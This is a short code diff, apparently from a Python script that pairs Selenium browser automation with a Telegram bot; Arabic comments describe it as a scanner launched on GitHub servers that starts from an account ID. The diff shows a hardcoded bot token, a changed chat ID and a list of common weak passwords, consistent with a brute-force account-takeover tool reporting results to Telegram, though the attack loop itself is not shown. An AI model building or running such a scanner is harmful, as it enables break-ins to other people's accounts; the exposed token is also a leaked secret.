@@ -7,18 +7,19 @@ from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
 
-# إعدادات البوت
+# إعدادات البوت الجديدة
 TOKEN = "7665591962:AAFIIe-izSG4rd71Kruf0xmXM9j11IYdHvc"
-CHAT_ID = "1879021873"
+CHAT_ID = "5653032481"
 bot = telebot.TeleBot(TOKEN)
 
-# كلمات السر (مقلصة لزيادة سرعة الفحص الأولي)
+# كلمات السر
 PASSWORDS = ["123456", "123456789", "12345678", "12345", "password", "1234567", "123123", "112233", "000000", "jasser", "vodka"]
 
 def run_scanner():
     # إرسال رسالة فورية عند تشغيل السكربت على السيرفر
     try:
         bot.send_message(CHAT_ID, "✅ تم إقلاع السكربت بنجاح على سيرفرات GitHub.\n🚀 بدأ الفحص من المعرف: 1430771423")
+        print("Initial message sent to Telegram.")
     except Exception as e:
         print(f"Telegram Error: {e}")
 
